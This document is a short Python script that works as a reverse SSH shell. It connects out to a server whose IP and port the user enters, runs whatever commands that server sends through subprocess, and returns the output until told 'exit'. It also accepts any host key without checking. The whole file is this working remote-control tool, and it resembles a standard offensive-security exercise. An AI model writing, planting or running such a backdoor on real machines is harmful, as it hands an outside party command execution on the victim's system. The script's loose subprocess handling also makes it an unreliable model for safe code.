import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, cmd):
    client = paramiko.SSHClient()
    # client.load_host_keys("/home/sar1n/.ssh/known_hosts")
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(cmd.encode())
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or b"OK")
            except Exception as e:
                ssh_session.send(str(e).encode())

        client.close()

    return

if __name__ == "__main__":
    import getpass
    
    user = input("Username: ")
    passwd = getpass.getpass()

    ip = input("Server IP: ")
    port = int(input("Port: "))
    ssh_command(ip, port, user, passwd, "ClientConnected")